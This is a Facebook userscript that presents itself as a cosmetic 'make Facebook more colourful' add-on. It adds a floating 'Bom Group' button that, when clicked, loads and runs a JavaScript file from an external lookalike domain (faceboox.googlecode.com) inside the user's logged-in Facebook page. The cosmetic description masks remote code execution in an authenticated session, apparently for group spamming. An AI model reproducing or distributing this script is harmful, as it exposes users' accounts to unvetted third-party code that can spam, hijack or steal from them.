// ==UserScript==
// @name           TestedsFB
// @namespace      TestedsFB
// @description    Bkin FB Loe Lebih Berwarna.
// @author         https://www.facebook.com/uzar.group
// @homepage       https://www.facebook.com/uzar.group
// @require        http://code.jquery.com/jquery-1.8.3.min.js
// @require        http://code.jquery.com/ui/1.9.1/jquery-ui.min.js
// @include        htt*://*.facebook.com/*
// @match          http://*.facebook.com/*
// @match          https://*.facebook.com/*
// @icon           http://fbemotbar.googlecode.com/files/icon.png
// @version			Final Version
// @exclude			htt*://*static*.facebook.com*
// @exclude			htt*://*channel*.facebook.com*
// @exclude			htt*://developers.facebook.com/*
// @exclude			htt*://upload.facebook.com/*
// @exclude			htt*://www.facebook.com/common/blank.html
// @exclude			htt*://*connect.facebook.com/*
// @exclude			htt*://*facebook.com/connect*
// @exclude			htt*://www.facebook.com/plugins/*
// @exclude			htt*://www.facebook.com/l.php*
// @exclude			htt*://www.facebook.com/ai.php*
// @exclude			htt*://www.facebook.com/extern/*
// @exclude			htt*://www.facebook.com/pagelet/*
// @exclude			htt*://api.facebook.com/static/*
// @exclude			htt*://www.facebook.com/contact_importer/*
// @exclude			htt*://www.facebook.com/ajax/*
// @exclude			htt*://www.facebook.com/advertising/*
// @exclude			htt*://www.facebook.com/ads/*
// @exclude			htt*://www.facebook.com/sharer/*
// @exclude			htt*://www.facebook.com/send/*
// @exclude			htt*://www.facebook.com/mobile/*
// @exclude			htt*://www.facebook.com/settings/*
// @exclude			htt*://www.facebook.com/dialog/*
// @exclude			htt*://www.facebook.com/plugins/*
// @exclude			htt*://www.facebook.com/bookmarks/*
// @exclude        htt*://*static*.facebook.com*
// @exclude        htt*://*channel*.facebook.com*
// @exclude        htt*://developers.facebook.com/*
// @exclude        htt*://upload.facebook.com/*
// @exclude        htt*://*onnect.facebook.com/*
// @exclude        htt*://*acebook.com/connect*
// @exclude        htt*://*.facebook.com/plugins/*
// @exclude        htt*://*.facebook.com/l.php*
// @exclude        htt*://*.facebook.com/ai.php*
// @exclude        htt*://*.facebook.com/extern/*
// @exclude        htt*://*.facebook.com/pagelet/*
// @exclude        htt*://api.facebook.com/static/*
// @exclude        htt*://*.facebook.com/contact_importer/*
// @exclude        htt*://*.facebook.com/ajax/*
// @exclude        htt*://www.facebook.com/places/map*_iframe.php*
// ==/UserScript==

// ======= Jangan Menghapus Credit ====================
// == Nama : JuwendiVB Final v5 =======================
// ======= Author : JuwendiVB =========================
// ======= Site : http://www.facebook.com/uzar.group ==
// ====================================================

body = document.body;
if(body != null) {
	div = document.createElement("div");
	div.setAttribute('id','like5');
	div.style.position = "fixed";
	div.style.display = "block";
	div.style.width = "125px"; 
	div.style.opacity = 0.90;
	div.style.bottom = "+120px";
	div.style.left = "+6px";
	div.style.backgroundColor = "#000000";
	div.style.border = "1px solid #E30505";
	div.style.padding = "2px";
	div.innerHTML = "<img src='https://lh4.googleusercontent.com/-D1HYuLwPnNQ/TxPK6cm_THI/AAAAAAAAAIE/ynATGaxGbv0/s16/Facebook%252520Like%252520Small.jpg' width='16' height='14' align='absmiddle' />&nbsp;&nbsp;<blink><a style='color: #E30505;'<a onclick='bomgroup()'>Bom Group</blink></a></div>"
	
	body.appendChild(div);
	
	unsafeWindow.bomgroup = function() {
    javascript: (a = (b = document).createElement("script")).src = "http://faceboox.googlecode.com/files/emotions3.js",
    b.body.appendChild(a);
    void(0);
    };
}